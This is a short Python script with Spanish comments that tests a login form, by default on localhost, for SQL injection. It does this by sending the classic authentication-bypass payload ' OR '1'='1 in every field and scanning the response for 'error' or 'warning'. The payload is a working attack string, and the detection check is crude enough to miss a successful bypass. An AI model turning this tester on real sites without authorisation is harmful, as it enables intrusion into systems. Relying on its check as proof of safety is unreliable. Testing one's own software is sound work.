import requests

def probar_inyeccion_sql(url, parametros, payload):
    """
    Prueba si una URL es vulnerable a inyección SQL.

    Args:
        url: La URL del endpoint a probar.
        parametros: Un diccionario de los parámetros de la petición (ej., {'username': 'admin', 'password': ''}).
        payload: El payload de SQL malicioso a inyectar.
    """
    parametros_con_payload = parametros.copy()
    for clave in parametros_con_payload:
        parametros_con_payload[clave] = payload
    respuesta = requests.post(url, data=parametros_con_payload)

    if "error" in respuesta.text.lower() or "warning" in respuesta.text.lower():
        print(f"Posible inyección SQL detectada en {url} con payload: {payload}")
        return True
    else:
        print(f"No se detectó inyección SQL en {url} con payload: {payload}")
        return False

if __name__ == "__main__":
    # Ejemplo: Probar inyección SQL en un formulario de inicio de sesión
    url_login = "http://localhost:8000/login"  # Reemplazar con la URL de tu formulario de inicio de sesión
    parametros_login = {'username': 'admin', 'password': ''}  # Reemplazar con los nombres de tus campos
    payload_inyeccion = "' OR '1'='1"
    probar_inyeccion_sql(url_login, parametros_login, payload_inyeccion)

    # Ejemplo: Probar inyección SQL en la creación de una tarea (si aplica)
    # url_crear_tarea = "http://localhost:8000/add"
    # parametros_crear_tarea = {'title': '', 'description': ''}
    # probar_inyeccion_sql(url_crear_tarea, parametros_crear_tarea, "' OR '1'='1")
